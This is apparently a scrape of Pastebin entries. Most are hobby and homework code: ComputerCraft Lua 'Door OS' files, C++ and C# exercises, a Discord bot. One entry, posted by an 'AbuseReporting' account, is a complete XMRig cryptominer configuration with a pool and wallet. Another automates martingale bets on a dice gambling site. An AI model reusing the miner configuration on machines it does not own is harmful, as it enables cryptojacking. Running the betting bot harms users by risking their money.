            else
                print(""CCVIM version is current."")
                print(""Press any key to continue..."")
                os.pullEvent(""key"")
            end
        end
    else
        print(""Failed to check version."")
        print(""Press any key to continue."")
        os.pullEvent(""key"")
    end
end

local running = true
while running == true do
    initialMenu()
    local _, ch = os.pullEvent(""char"")
    while tonumber(ch) == nil do
        _, ch = os.pullEvent(""char"")
    end
    if ch == ""1"" then
        term.clear()
        term.setCursorPos(1, 1)
        install()
    elseif ch == ""2"" then
        term.clear()
        term.setCursorPos(1, 1)
        addToPath()
    elseif ch == ""3"" then
        term.clear()
        term.setCursorPos(1, 1)
        syntax()
    elseif ch == ""4"" then
        term.clear()
        term.setCursorPos(1, 1)
        update()
    elseif ch == ""5"" then
        term.clear()
        term.setCursorPos(1, 1)
        running = false
    end
end"
1DnMrZyC,DOOR-OS-INSTALLER,Chomudit,Lua,Monday 29th of January 2024 07:59:46 AM CDT,"local files = {""https://pastebin.com/raw/188w8sAR"", ""https://pastebin.com/raw/kZLWzTmq"", ""https://pastebin.com/raw/sHN9zgZv"", ""https://pastebin.com/raw/7Jthrp8J"", ""https://pastebin.com/raw/SYsYAvuD"", ""https://pastebin.com/raw/vkiYhy9G"", ""https://pastebin.com/raw/YqhAEyQh"", ""https://pastebin.com/raw/wFKC5Y5T"", ""https://pastebin.com/raw/dxKtQSgA""}
local names = {""startup.lua"", ""verify.lua"", ""/os/programmanger.lua"", ""/os/filemgr.lua"", ""/os/doorcli.lua"", ""/os/data/brokendoor.nfp"", ""/os/data/logo.nfp"", ""viminstaller.lua"", ""cash.lua""}
print(""Door OS will need CCVIM(Please setup its path too in the installer) and Cash shell(Please setup its path too in the installer). Their installer will be runned automaticly"")
print(""Install DOOR-OS ? Y/N "")
inp = read():lower()
if inp == ""y"" then
    shell.run(""mkdir /os"")
    shell.run(""mkdir /os/data"")
    shell.run(""mkdir /os/programs"")
    for i = 1, #names, 1 do
        shell.run(""pastebin get ""..files[i].."" ""..names[i])
    end
    shell.run(""cp /rom/programs/fun/worm.lua /os/programs"")
    shell.run(""cp /rom/programs/fun/hello.lua /os/programs"")
    shell.run(""viminstaller.lua"")
    shell.run(""rm viminstaller.lua"")
end
"
GnVVGMDf,Untitled,MeehoweCK,C++,Monday 29th of January 2024 07:58:34 AM CDT,"#include <iostream>

using namespace std;

int main() {
	unsigned int liczba, licznik_parzyste{}, licznik_nieparzyste{};
	do {
		cout << ""Podaj liczbe naturalna: "";
		cin >> liczba;
		if (liczba % 2 == 0) {
			++licznik_parzyste;
		}
		else {
			++licznik_nieparzyste;
		}
	} while (liczba != 0);
	cout << ""Wczytano "" << licznik_nieparzyste << "" liczb nieparzystych i "" << --licznik_parzyste << "" liczb parzystych.\n"";
	return 0;
}"
auXLNrvm,Untitled,MeehoweCK,C++,Monday 29th of January 2024 07:38:56 AM CDT,"#include <iostream>

using namespace std;

int main() {
	unsigned int suma{}, liczba;
	for (short int i{}; i < 10; ++i) {
		cout << ""Podaj liczbe naturalna: "";
		cin >> liczba;
		suma += liczba;
	}
	cout << ""Suma wczytanych liczb wynosi "" << suma << endl;
	return 0;
}"
SYsYAvuD,DOOR-OS-doorcli.lua,Chomudit,Lua,Monday 29th of January 2024 07:38:48 AM CDT,"shell.run(""fg cash"")
"
7Jthrp8J,DOOR-OS-filemgr.lua,Chomudit,Lua,Monday 29th of January 2024 07:37:43 AM CDT,"term.clear()
filelist = fs.list(""/"")
currentdir = ""/""
while true do
    w, h = term.getSize()
    term.setBackgroundColor(colors.blue)
    term.clear()
    paintutils.drawLine(1, 1, w, 1, colors.white)
    term.setTextColor(colors.black)
    term.setCursorPos(1, 1)
    print(""File manager"")
    term.setBackgroundColor(colors.blue)
    term.setTextColor(colors.white)
    print(currentdir)
    print("""")
    for i = 1, #filelist, 1 do
        print(filelist[i])
    end
    print(""Use help for help"")
    inp = read():lower()
    if inp == ""help"" then
        print(""cp - copy(todo) \n mv - move(todo) \n op - view a file \n cr - create file \n cd - change dir \n rm - remove file or dir \n edit - open vim"")
    elseif inp == ""op"" then
        inp = currentdir..read()
        if fs.exists(inp) then
            file = fs.open(inp, ""r"")
        end
        print(file.readAll())
        file.close() 
        print(""Press any key to close file"")
    elseif inp == ""cr"" then
        inp = read()
        if not(fs.exists(currentdir..inp)) then
            file = fs.open(currentdir..inp, ""w"")
        end
        filelist = fs.list(currentdir)
        file.close() 
    elseif inp == ""rm"" then
        inp = currentdir..read()
        if fs.exists(inp) then
            shell.run(""rm ""..inp)
        end
        filelist = fs.list(currentdir)
    elseif inp == ""cd"" then
        inp = read()
        if fs.exists(currentdir..inp) then
            if currentdir..inp == currentdir.."".."" then
                currentdir = ""/""..fs.getDir(currentdir)..""/""
                filelist = fs.list(currentdir)
            else
                currentdir = currentdir..inp..""/""
                filelist = fs.list(currentdir)
            end
        end
    elseif inp == ""exit"" then
        print(""Press any key (exept enter it breaks the system lol)"")
        break
    elseif inp == ""edit"" then
        inp = read()
        shell.run(""fg vim ""..currentdir..inp)
    else
        print(""Command not found"")
    end
    event, key = os.pullEvent(""key"")
end
"
sHN9zgZv,DOOR-OS-programmanager.lua,Chomudit,Lua,Monday 29th of January 2024 07:37:00 AM CDT,"while true do
    w, h = term.getSize()
    term.setBackgroundColor(colors.blue)
    term.clear()
    term.setCursorPos(1, 1)
    paintutils.drawLine(1, 1, w, 1, colors.white)
    term.setTextColor(colors.black)
    term.setCursorPos(1, 1)
    print(""Program manager"")
    term.setTextColor(colors.white)
    term.setBackgroundColor(colors.blue)
    filelist = fs.list(""/os/programs"")
    for i = 1, #filelist, 1 do
        if not(fs.isDir(""/os/programs/""..filelist[i])) then
            print(filelist[i])
        end
    end
    print(""Enter program name to run or type help for help."")
    inp = read()
    if inp == ""help"" then
        print(""Use exit to exit \n and thats it !"")
        print(""Print any key to continue..."")
    elseif inp == ""exit"" then
        print(""Press any key to continue (exept enter it breaks the system lol)"")
        break
    else
        for i = 1, #filelist, 1 do 
            if inp == filelist [i] then
                if not(fs.isDir(""/os/programs/""..inp)) then
                    shell.run(""/os/programs/""..inp)
                    print(""Program finished press any key"")
                    break
                end
            elseif #filelist == i then
                print(""File not found "")
            end
        end
    end
    event, key = os.pullEvent(""key"")
end
"
kZLWzTmq,DOOR-OS-verify.lua,Chomudit,Lua,Monday 29th of January 2024 07:34:49 AM CDT,"print(""Doing pre-startup checklist"")
--file check
print(""Starting verification..."")
local files = {""startup.lua"", ""os"", ""os/filemgr.lua"", ""os/doorcli.lua"", ""os/programmanger.lua"", ""os/programs"", ""os/data""}
local fnf = false
for i = 1, #files, 1 do
    if not(fs.exists(files[i])) then
        print(""Not found ""..files[i])
        fnf = true
    else
        print(""Verified ""..files[i])
    end
end
if fnf then
    error(""Required file not found"")
end
print(""Verification done..."")
-- load error files
errimg = paintutils.loadImage(""/os/data/brokendoor.nfp"")
--overwrite the default error function
function error(text) 
    paintutils.drawImage(errimg, 1, 1)
    term.setBackgroundColor(colors.red)
    x, y = term.getCursorPos()
    term.setCursorPos(1, y + 1)
    print(text)
    while true do
        event, key = os.pullEvent(""key"")
        print(""Error encountered while running checklist. ""..text)
        print(""Press R to reboot and retry"")
        if key == keys.r then
            shell.run(""reboot"")
        end
    end
end
-- computer check
print(""Doing computer check"")
if not(term.isColor() and pocket and turtle) then
    print(""Computer check finished"")
else
    error(""Computer check failed"")
end
--label check
print(""Doing final checks"")
if os.getComputerLabel() == nil then
    print(""No label set setting lable"")
    shell.run(""label set ""..os.getComputerID())
    print(""Label set new label is ""..os.getComputerID())
end
print(""Final checks complete"")
-- end
print(""Pre-startup checklist complete"")
"
188w8sAR,DOOR-OS-startup.lua,Chomudit,Lua,Monday 29th of January 2024 07:32:45 AM CDT,"shell.setPath(shell.path().."":/vim/"") -- set the path for CCVIM
w, h = term.getSize()
options = {""Programs"", ""File mamager"", ""Shutdown"", ""CLI""}
cmds = {""/os/programmanger"", ""/os/filemgr"", ""/rom/programs/shutdown"", ""/os/doorcli""}
sel = 2
if #cmds ~= #options then
    error(""Cmds not equal to options (#options ~= #cmds)"")
end
term.clear()
term.setCursorPos(1, 1)
shell.run(""screenfetch"")
if fs.exists(""verify.lua"") then
    require(""verify"")
else
    error(""Unable to run pre-startup checklist"")
end
shell.run(""drive"")
textutils.slowPrint(""##########"")
sleep(2)
logo = paintutils.loadImage(""os/data/logo.nfp"")
paintutils.drawImage(logo, 1, 1)
sleep(2)
while true do
    w, h = term.getSize()  
    term.setBackgroundColor(colors.blue)
    term.clear()
    term.setCursorPos(1, 1)
    paintutils.drawLine(1, 1, w, 1, colors.white)
    term.setCursorPos(1, 1)
    term.setTextColor(colors.black)
    print(""Door_ OS: ""..os.getComputerLabel())
    term.setBackgroundColor(colors.blue)
    term.setTextColor(colors.white)
    print("""") -- leave a line
    print(""This computer is ""..os.getComputerID())
    for i = 1, #options, 1 do
        if sel == i then
             print(""[""..options[i]..""]"" ) 
        else
            print(options[i])
        end
    end
    if key == keys.up then
        sel = sel - 1
    end
    if key == keys.down then
        sel = sel + 1
    end
    if sel > #options then 
        sel = 1
    end
    if sel < 0 or sel == 0 then
        sel = #options
    end
    if key == keys.enter then
        if cmds[sel-1] ~= nil then
           -- os.run({}, cmds[sel-1])
               require(cmds[sel-1])
        else
           -- os.run({}, cmds[#options]) 
           require(cmds[#options])
         end
    end
    event, key = os.pullEvent(""key"") -- get pressed key and wait
end
"
sFGNgPsb,C#_3_shift_array's_values,Legiomax,C#,Monday 29th of January 2024 07:15:00 AM CDT,"using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C_Ijun
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();

            int lowRandomNumber = 4;
            int highRandomNumber = 8;
            int lowRangeRandom = 0;
            int highRangeRandom = 10;
            int shiftLeftCount;
            int tempNumber;

            int rangeArray = random.Next(lowRandomNumber, highRandomNumber);
            int[] numbers = new int[rangeArray];

            for (int i = 0; i < numbers.Length; i++)
            {
                numbers[i] = random.Next(lowRangeRandom, highRangeRandom);
            }

            Console.WriteLine(""–ò—Å—Ö–æ–¥–Ω–∞—è —Å—Ç—Ä–æ–∫–∞ —á–∏—Å–µ–ª:"");

            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }

            Console.Write(""\n–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–µ —Å–¥–≤–∏–Ω—É—Ç—å –º–∞—Å—Å–∏–≤ —á–∏—Å–µ–ª –≤–ª–µ–≤–æ - "");
            shiftLeftCount = Convert.ToInt32(Console.ReadLine());

            shiftLeftCount %= numbers.Length;

            for (int i = 0; i < shiftLeftCount; i++)
            {
                tempNumber = numbers[0];

                for (int j = 0; j < numbers.Length - 1; j++)
                {
                    numbers[j] = numbers[j + 1];
                }

                numbers[numbers.Length - 1] = tempNumber;
            }

            Console.WriteLine(""\n–°–¥–≤–∏–Ω—É—Ç–∞—è —Å—Ç—Ä–æ–∫–∞ —á–∏—Å–µ–ª:"");

            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }

            Console.ReadKey();
        }
    }
}
"
SBBK9wiB,Currency Format,Pijomir,JavaScript,Monday 29th of January 2024 06:55:59 AM CDT,"function createFormatter(separator, symbol, symbolFirst, currencyFormatter) {
    return (value) => currencyFormatter(separator, symbol, symbolFirst, value)
}

function currencyFormatter(separator, symbol, symbolFirst, value) {
    let result = Math.trunc(value) + separator;
    result += value.toFixed(2).substr(-2,2);
    if (symbolFirst) return symbol + ' ' + result;
    else return result + ' ' + symbol;
}

let dollarFormatter = createFormatter(',', '$', true, currencyFormatter);
console.log(dollarFormatter(5345));   
console.log(dollarFormatter(3.1429)); 
console.log(dollarFormatter(2.709));  
"
GWir2fyM,Max Heap,Eternoseeker,C++,Monday 29th of January 2024 06:47:07 AM CDT,"#include<iostream>
#include<algorithm>

class MaxHeap{
    int* arr;
    int maxSize;
    int heapSize;
public:
    explicit MaxHeap(int size) {
        heapSize = 0;
        maxSize = size;
        arr = new int[size];
    }
    void MaxHeapify(int i);
    int removeMax();
    void increaseKey(int i, int newVal);
    void deleteKey(int i);
    void insertKey(int x);
    void displayHeap();
    void HeapSort();
    static int parent(int i){
        return (i - 1) / 2;
    }
    static int LeftChild(int i){
        return (2 * i + 1);
    }
    static int RightChild(int i){
        return (2 * i + 2);
    }
    int getMax(){
        return arr[0];
    }
    int curSize(){
        return heapSize;
    }
};

// Increases value of the key at index 'i' to new_val
void MaxHeap::increaseKey(int i, int newVal) {
    arr[i] = newVal;
    while(i != 0 && arr[parent(i)] < arr[i]){
        std::swap(arr[i], arr[parent(i)]);
        i = parent(i);
    }
}

void MaxHeap::deleteKey(int i) {
    //Setting key to max value and then removing it
    increaseKey(i, INT_MAX);
    removeMax();
}

void MaxHeap::insertKey(int x) {
    //Allocating more space
    if(heapSize == maxSize){
        int* newArr = new int[2 * maxSize];
        for(int i = 0; i < maxSize; i++){
            newArr[i] = arr[i];
        }
        delete[] arr;
        arr = newArr;
        maxSize *= 2;
    }

    heapSize++;
    //Initially inserted at the end
    int i = heapSize - 1;
    arr[i] = x;
    //Making sure max heap property satisfied
    while(i != 0 && arr[parent(i)] < arr[i]){
        std::swap(arr[i], arr[parent(i)]);
        i = parent(i);
    }
}

//Remove the root node which is the max element
int MaxHeap::removeMax() {
    if(heapSize <= 0){
        return INT_MIN;
    }
    if(heapSize == 1){
        heapSize--;
        return arr[0];
    }

    //storing the max element
    int root = arr[0];

    //last element is made the root
    arr[0] = arr[heapSize - 1];
    heapSize--;

    //Restore the property of the heap
    MaxHeapify(0);
    return root;
}

void MaxHeap::MaxHeapify(int i) {
    int l = LeftChild(i);
    int r = RightChild(i);
    //Set current element as largest and swap accordingly
    int largest = i;
    if(l < heapSize && arr[l] > arr[i]){
        largest = l;
    }
    if(r < heapSize && arr[r] > arr[largest]){
        largest = r;
    }
    if(largest != i){
        std::swap(arr[i], arr[largest]);
        MaxHeapify(largest);
    }
}

void MaxHeap::displayHeap() {
    for(auto i = 0; i < heapSize; i++){
        std::cout << arr[i] << "" "";
    }
    std::cout << ""\n"";
}

void MaxHeap::HeapSort() {
    int* sortedArray = new int[heapSize];
    int* tempArray = new int[maxSize];
    int tempsize = heapSize;
    // Copy the original array to tempArray
    std::copy(arr, arr + tempsize, tempArray);
    // Perform heap sort and store the sorted elements in sortedArray
    for (auto i = tempsize - 1; i >= 0; i--) {
        sortedArray[i] = removeMax();
    }
    for(auto i = 0; i < tempsize; i++){
        std::cout << sortedArray[i] << "" "";
    }
    std::cout << ""\n"";
    delete[] arr;
    heapSize = tempsize;
    arr = tempArray;
    // Copy elements back to arr
//    std::copy(tempArray, tempArray + tempsize, arr);
}

void prompts(){
    std::cout << ""1: Display the array \n"";
    std::cout << ""2: Insert a key \n"";
    std::cout << ""3: Size of the heap\n"";
    std::cout << ""4: Maximum element \n"";
    std::cout << ""5: Delete a key \n"";
    std::cout << ""6: Perform Heap Sort \n"";
    std::cout << ""0: EXIT \n"";
    std::cout << ""Enter your choice: \n"";
}

int inputValue(){
    int value;
    std::cout << ""Enter a value: \n"";
    std::cin >> value;
    return value;
}

int main(){
    MaxHeap maxheap(10);
    int choice = 10;
    while(choice != 0){
        prompts();
        std::cin >> choice;
        switch (choice) {
            case 0:
                std::cout << ""Exited Successfully! \n"";
                break;
            case 1:
                std::cout << ""The heap array: \n"";
                maxheap.displayHeap();
                break;
            case 2:
                maxheap.insertKey(inputValue());
                break;
            case 3:
                std::cout << ""The current size of the heap is: "" << maxheap.curSize();
                std::cout << ""\n"";
                break;
            case 4:
                std::cout << ""The max(root) element is: "" << maxheap.getMax();
                std::cout << ""\n"";
                break;
            case 5:
                maxheap.deleteKey(inputValue());
                break;
            case 6:
                std::cout << ""The sorted array: \n"";
                maxheap.HeapSort();
                break;
            default:
                std::cout << ""Not a valid choice! \n"";
                break;
        }
    }
    return 0;
}"
uaB8tgaD,NVIDIA/CUDA & CPU Configuration For XMRIG,AbuseReporting,JSON,Monday 29th of January 2024 06:36:46 AM CDT,"{
    ""api"": {
        ""id"": null,
        ""worker-id"": null
    },
    ""http"": {
        ""enabled"": false,
        ""host"": ""127.0.0.1"",
        ""port"": 0,
        ""access-token"": null,
        ""restricted"": true
    },
    ""autosave"": true,
    ""background"": false,
    ""colors"": true,
    ""title"": true,
    ""randomx"": {
        ""init"": -1,
        ""init-avx2"": -1,
        ""mode"": ""auto"",
        ""1gb-pages"": false,
        ""rdmsr"": true,
        ""wrmsr"": true,
        ""cache_qos"": false,
        ""numa"": true,
        ""scratchpad_prefetch_mode"": 1
    },
    ""cpu"": {
        ""enabled"": true,
        ""huge-pages"": true,
        ""huge-pages-jit"": false,
        ""hw-aes"": null,
        ""priority"": null,
        ""memory-pool"": false,
        ""yield"": true,
        ""asm"": true,
        ""argon2-impl"": null,
        ""argon2"": [0],
        ""cn"": [
            [1, 0]
        ],
        ""cn-heavy"": [
            [1, 0]
        ],
        ""cn-lite"": [
            [1, 0]
        ],
        ""cn-pico"": [
            [2, 0]
        ],
        ""cn/upx2"": [
            [2, 0]
        ],
        ""ghostrider"": [
            [8, 0]
        ],
        ""rx"": [0],
        ""rx/wow"": [0],
        ""cn-lite/0"": false,
        ""cn/0"": false,
        ""rx/arq"": ""rx/wow"",
        ""rx/keva"": ""rx/wow""
    },
    ""log-file"": null,
    ""donate-level"": 1,
    ""donate-over-proxy"": 1,
    ""pools"": [
        {
            ""algo"": null,
            ""coin"": null,
            ""url"": ""pool.hashvault.pro:80"",
            ""user"": ""83tyU8mZBHG2KR8VMaeCESdk2KScXQu6uM2a4UMCKysVWZ2VNNhpjbU7VjYgX3bMpHN2CwxopVGRvTtn2FkrGYM4Nuot3Wz"",
            ""pass"": ""public"",
            ""rig-id"": null,
            ""nicehash"": false,
            ""keepalive"": false,
            ""enabled"": true,
            ""tls"": true,
            ""sni"": false,
            ""tls-fingerprint"": null,
            ""daemon"": false,
            ""socks5"": null,
            ""self-select"": null,
            ""submit-to-origin"": false
        }
    ],
    ""retries"": 50,
    ""retry-pause"": 15,
    ""print-time"": 60,
    ""dmi"": true,
    ""syslog"": true,
    ""tls"": {
        ""enabled"": true,
        ""protocols"": null,
        ""cert"": null,
        ""cert_key"": null,
        ""ciphers"": null,
        ""ciphersuites"": null,
        ""dhparam"": null
    },
    ""dns"": {
        ""ipv6"": false,
        ""ttl"": 30
    },
    ""user-agent"": null,
    ""verbose"": 3,
    ""watch"": true,
    ""pause-on-battery"": false,
    ""pause-on-active"": false
}"
bT4NGSCA,snowy manual,coinwalk,JavaScript,Monday 29th of January 2024 06:08:33 AM CDT,"var firstbal = parseFloat(document.getElementById('pct_balance').value);
var divideby = 100;
var base = Number((firstbal/divideby).toFixed(8));
var jove = parseFloat(document.getElementById('pct_balance').value);
var bilance = firstbal;
var dodgey = firstbal;
var kitty = firstbal;
var tens = (base*10);
var increased = base;
var sevens = (base*6.9);
var eights = (base*7.9);
var trget = firstbal;
var flyer = 6.9;
var drowner = 2.9;
var one = ((Math.floor(firstbal/tens))*tens);
var two = firstbal;
var old = firstbal;


function get(){
bilance = parseFloat(document.getElementById('pct_balance').value);
var good = ((bilance-jove).toFixed(8));
console.log(""profit"");
console.log(good);
if (bilance>(one+(increased*flyer))){
    	increased = increased*2;
    	flyer = 4.9;
    	drowner = 4.9;
    	one = parseFloat(bilance);
}
if (bilance<(one-(increased*drowner))){
   	increased = increased*2;
    	flyer = 4.9;
    	drowner = 4.9;
    	one = parseFloat(bilance);
}
if ((bilance>=(old+(base*32)))&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
	increased = base;
  	flyer = 6.9;
   	drowner = 2.9;
	one = ((Math.floor(bilance/tens))*tens);
	old = parseFloat(bilance);
	two = parseFloat(bilance);
}
if (((bilance-(increased*3))<=(two-(base*32)))&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
	increased = base;
  	flyer = 6.9;
   	drowner = 2.9;
	one = ((Math.floor(bilance/tens))*tens);
	old = parseFloat(bilance);
}
if ((bilance<=(two-(base*32)))&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
  	increased = base;
  	flyer = 6.9;
   	drowner = 2.9;
	one = ((Math.floor(bilance/tens))*tens);
	old = parseFloat(bilance);
	two = parseFloat(bilance);
}
	return ((increased*1).toFixed(8));
}

function dobet(){
belance = document.getElementById('pct_balance').value;
if (belance>=(jove*2.4)) {
	console.log(""winner winner chicken dinner"");
	return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(get());
$('#a_lo').click();
setTimeout(() => dobet(), 350);
}
dobet()"
jADbihAr,check_season,naren_paste,Python,Monday 29th of January 2024 06:04:55 AM CDT,"def get_season(month):
    if month in [3, 4, 5]:
        return ""Spring""
    elif month in [6, 7, 8]:
        return ""Summer""
    elif month in [9, 10, 11]:
        return ""Autumn""
    elif month in [12, 1, 2]:
        return ""Winter""
    else:
        return ""Invalid month number""

def main():
    month_number = int(input(""Enter the month number (1-12): ""))
    season = get_season(month_number)
    print(""The season for month"", month_number, ""is"", season)

if __name__ == ""__main__"":
    main()
"
DcMrHWkq,ÈÇÄÊÇ®‰∏ÄËµ∑ÁúãÔºöGoldenSand,xiaomianao666,JavaScript,Monday 29th of January 2024 06:03:01 AM CDT,Êµ∑ÈòîËßÜÁïåËßÑÂàôÂàÜ‰∫´ÔºåÂΩìÂâçÂàÜ‰∫´ÁöÑÊòØÔºö‰∫åÁ∫ßÈ°µÈù¢ËØ¶ÊÉÖÔø•page_detailÔø•GoldenSand@@
uA5ZEzsN,data826,TestGuy1,JSON,Monday 29th of January 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'b11f9990a05ffb875bffeccd8845dff91ae27ab27d12a77d7da43c4ba50232a769fde754735aac2126005de150bbf318ecb44d232810c3670bf13f24d88c671faf24e7635f325c00006f26f5fd7c4b818d68fca7d4c7f072e6f2f9d0d6f08d458e76cfa83e02fd3b64e0a1f5068971b609cdd76ac11e950468b78a95fc80b9c1',
  otherdata: [
    '38932eab8aa67b61180f4a76a1875d17',
    'd40f9ad927edb227b962089de945b8d3',
    '3ac97f352c7ff64e8a2ee0614791183a',
    '0c62305800a56d7d56517cdc8e99e6ae',
    '28b03b2d6a9f0678356be507d57fa524',
    '84ad71fd70a5cab864a9c0c90686aa98',
    '1879a6eac5c4bc4ba1636ab24630e10d',
    'f7649b31aafe3c382acb02efd9d12360'
  ]
}"
w12UiWd7,paste test,dolomite42,C,Monday 29th of January 2024 05:59:03 AM CDT,"Pasted at: 29/01/2024 11:59
aeced86c-bc68-42ca-bdd3-ec3bb0c540b0@gmail.com"
vHX0Ti8F,Untitled,NaroxEG,Python,Monday 29th of January 2024 05:57:53 AM CDT,"import discord
from discord.ext import commands

client = commands.Bot(command_prefix=""!"", intents=discord.Intents.default())
tree = client.tree

@client.event
async def on_ready():
    print(f""Logged in as {client.user}"")
    synced = await tree.sync()
    print(f""Synced {len(synced)} Command(s)."")

class Dropdown(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label=""Select 1"", description=""First Select Option""),
            discord.SelectOption(label=""Select 2"", description=""Second Select Option""),
            discord.SelectOption(label=""Select 3"", description=""Third Select Option""),
            discord.SelectOption(label=""Select 4"", description=""Fourth Select Option""),
            discord.SelectOption(label=""Select 5"", description=""Fifth Select Option""),
        ]
        super().__init__(placeholder=""Select an element"", min_values=2, max_values=3, options=options)

    async def callback(self, interaction: discord.Interaction):
        elements = "","".join(x for x in self.values)
        await interaction.response.send_message(f""You chose {elements}"")

class DropdownView(discord.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(Dropdown())


@tree.command(name=""select"")
async def _select(interaction: discord.Interaction):
    await interaction.response.send_message(view=DropdownView())


client.run(""TOKEN"")"
thrwJgbW,Table,tanim1999,HTML,Monday 29th of January 2024 05:42:33 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <title>Document</title>
</head>
<body>
    <table border=""1"" cellspacing=""0"" cellpadding=""10"" width=""200"" height=""200"" align=""center"">
        <tr align=""center"" valign=""top"">
            <td colspan=""2"">Name</td>
        </tr>
        <tr>
            <td rowspan=""2"">Rahim</td>
            <td>
                <ol start=""4"">
                    <li>pen</li>
                    <li>Khata</li>
                    <li>Book</li>
                </ol>
                
            </td>
        </tr>
        <tr>
            <td>2</td>
        </tr>
    </table>
</body>
</html>"
8nyc9uiY,Untitled,Nenogzar,Python,Monday 29th of January 2024 05:34:04 AM CDT,"people_in_the_circle = list(map(int, input().split()))
number_k = int(input())

people_in_the_suicided = []
suicided_list = []

count = 1
index = 0

while len(people_in_the_circle) > 0:
    index = (index + number_k - 1) % len(people_in_the_circle)
    suicided_person = people_in_the_circle.pop(index)
    suicided_list.append(str(suicided_person))

print('[' + ','.join(suicided_list) + ']')"
Xui4gydw,T-shirts-bag problem,ridwan100,C++,Monday 29th of January 2024 05:31:25 AM CDT,"#include<bits/stdc++.h>
using namespace std;

void distributionMultipleBags(int bags,int shirts,vector<int>&filledBags){
    int i = 0;
    int shirtPerBag = shirts/bags;
    while(i<bags){
        filledBags[i] = shirtPerBag;
        shirts -= shirtPerBag;
        i++;
    }
int j = 0;
while(shirts>0){
    filledBags[j]++;
    j++;
    shirts--;
}


}
int main(){
    // int bags = 10;
    // int shirts = 206;
    //  int bags = 5;
    //  int shirts = 86;
    int bags = 100;
    int shirts = 199;
    vector<int>filledBags(bags,0);
    //solution with uneven shirts in multiple bags
    distributionMultipleBags(bags,shirts,filledBags);

    for(int i = 0;i<filledBags.size();i++){
        cout<<filledBags[i]<<endl;
    }


}
"
pC5SM63x,paste test,dolomite42,C,Monday 29th of January 2024 05:00:29 AM CDT,"Pasted at: 29/01/2024 11:00
186272fd8-344d-4338-9d78-c18411eb347d@gmail.com"
bYCGdtmn,paste test,dolomite42,C,Monday 29th of January 2024 05:00:28 AM CDT,"Pasted at: 29/01/2024 11:00
086272fd8-344d-4338-9d78-c18411eb347d@gmail.com"
AgKVHA6v,paste test,dolomite42,C,Monday 29th of January 2024 05:00:20 AM CDT,"Pasted at: 29/01/2024 11:00
2038dcd459-16bc-4641-bc03-eb2ed911db02@gmail.com"
